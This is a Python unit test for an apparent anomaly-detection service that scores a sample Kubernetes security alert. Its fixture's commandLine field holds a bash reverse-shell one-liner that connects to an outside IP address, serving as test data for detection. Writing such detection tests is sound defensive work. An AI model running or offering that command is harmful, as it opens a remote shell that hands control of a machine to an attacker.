from app.services.inference_service import InferenceService
from app.schemas.analyze import AnalyzeRequest, AnalysisResponse

def test_analyze_service():
    payload = {
        "id": "AL-8491",
        "timestamp": "2026-06-25T21:14:32Z",
        "source": "srv-k8s-api-01",
        "type": "Unusual Namespace Creation & Exec",
        "severity": "critical",
        "category": "process",
        "description": "Anomalous bash execution detected.",
        "details": {
            "processPath": "/usr/bin/bash",
            "parentProcess": "/usr/bin/containerd-shim",
            "commandLine": "bash -i >& /dev/tcp/194.26.135.84/443 0>&1"
        }
    }

    # Validate request schema
    request = AnalyzeRequest(**payload)
    
    # Run service analysis
    service = InferenceService()
    res = service.analyze(request.model_dump())
    
    # Validate response schema
    response = AnalysisResponse(**res)
    
    # Assertions
    assert isinstance(response.anomaly_score, float)
    assert isinstance(response.risk_score, float)
    assert isinstance(response.severity, str)
    assert isinstance(response.is_anomaly, bool)

    print("OK: Service and schema validation tests passed successfully!")

if __name__ == "__main__":
    test_analyze_service()